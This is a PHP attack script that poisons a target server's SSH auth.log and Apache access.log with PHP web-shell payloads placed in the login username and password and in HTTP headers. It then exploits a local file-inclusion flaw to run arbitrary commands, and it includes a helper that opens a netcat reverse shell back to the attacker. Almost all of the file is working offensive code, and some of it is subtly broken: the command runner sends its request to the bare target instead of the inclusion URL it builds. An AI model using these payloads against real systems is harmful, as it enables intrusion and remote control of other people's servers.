<?php

/* 
 * This utility tries to poison different types of logs including apache and SSH
 * The concept is to inject a piece of PHP into the target log that executes an 
 * arbitrary command. 
 */

$options = getopt("t:l:d");
$logTypes = array("ssh","apache","all");
$lopts = implode(",", $logTypes);
$usage = "\n\nMust have (-t)arget and (-l)og type [{$lopts}] (-d)ebug\n";
if(count($options) < 2){
    print $usage;
    exit(1);
}
if(!in_array($options["l"],$logTypes)){
    print $usage;
    exit(1);
}

$target = $options["t"];
if($options["d"]){
    print json_encode(array("host"=>$target,"result"=>"success"));
    exit(0);
}
if($options["l"] == "all" || $options["l"] == "ssh"){
    //attempt to poison auth.log
    print "Attempting to Poison {$target} ssh auth log\n";
    poisonSSHRequest($target);
}
if($options["l"] == "all" || $options["l"] == "apache"){
    //attempt to poison access.log
    print "Attempting to Poison {$target} apache access log\n";
    poisonApache($target);
}

Print "Poison attempts complete\n";
exit(0);
/**
 * Attempts to inject the poison into the auth.log log
 * via a failed ssh login with one or more controlled paramaters set to the 
 * poison string.
 * 
 * @param string $target
 * @param boolean $poisonUser if false, the password will also contain the poison
 * @return boolean will always fail.
 */
function poisonSSHRequest($target,$port=22,$poisonUserOnly = true){
    $poison = "<?php passthru(\$_GET['cmd']); ?>";
    $poison2 = "<?php passthru(\$_GET['cmd2']); ?>";
    $connection = ssh2_connect($target, $port);
    $pass = ($poisonUserOnly) ? "password":$poison2;
    if (ssh2_auth_password($connection, $poison, $pass)) {
        print("Authentication Successful! that is most unexpected...\n");
    } else {
        print("Authentication Failed...duh ;)\n");
    }
}

/**
 * Poison the Apache access log by manipulating the request headers. The advantage
 * of this type of attack is that it allows for 3 commands to be passed instead
 * of 1-2 for SSH
 * 
 * @param Host string $target
 */
function poisonApache($target){
    //Poisoned Headers to send.
    $header = array(
        "GET /<?php system(\$_GET['cmd']); ?> HTTP/1.1",
        "Host: localhost",
        "User-Agent: <?php passthru(\$_GET['cmd3']); ?>",
        "Referer: <?php passthru(\$_GET['cmd2']); ?>"
    );
    //cURL starts
    $crl = curl_init();
    curl_setopt($crl, CURLOPT_URL, $target);
    curl_setopt($crl, CURLOPT_HTTPHEADER,$header);
    curl_setopt($crl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($crl, CURLOPT_HTTPGET,true);
    $reply = curl_exec($crl);

    //error handling for cURL
    if ($reply === false) {
       // throw new Exception('Curl error: ' . curl_error($crl));
       print_r('Curl error: ' . curl_error($crl));
    }
    curl_close($crl);
    //cURL ends
    print  $reply;
}

/**
 * A built in command to speed up stating a simple netcat reverse shell and
 * exemplify calling the raw command executor
 * 
 * @param string $target Host string
 * @param string $poisoned File path to poisoned log
 * @param string $lHost local IP address for connect back
 * @param int $lPort local port for connect back default=31337
 */
function setupNCReverseShell($target,$poisoned,$lHost,$lPort=31337){
    $cmds=array("cmd","nc {$lHost} {$lPort}");
    $listenerCmd = "nc -lp {$lPort} -vvv &";
    exec($listenerCmd);//Starts the listener
    executeRawCommands($target,$poisoned,$cmds);//Passes the command
}

/**
 * Builds a request to exploit the File Inclusion vulnerability by including the
 * poisoned log and passing it a number of commands to execute. The log needs to
 * have been previously poined with the <?php system(\$_GET['cmd']); ?> string
 * 
 * @param IP string $target
 * @param log path $poisoned the path to the poisoned long to include
 * @param array $cmds 1-3 commands to try and execute on the poisoned host
 */
function executeRawCommands($target,$poisoned,$cmds){
    $cmd = "http://{$target}/?file={$poisoned}";
    /**
     * Valid cmd keys are cmd,cmd1,cmd2,and cmd3 depending on the log poisoned
     */
    foreach ($cmds as $k=>$c){
        $cmd .= "&{$k}={$c}";
    }
    //cURL the newly poisined target
    $crl = curl_init();
    curl_setopt($crl, CURLOPT_URL, $target);
    curl_setopt($crl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($crl, CURLOPT_HTTPGET,true);
    $reply = curl_exec($crl);
    print $reply . "\n";
}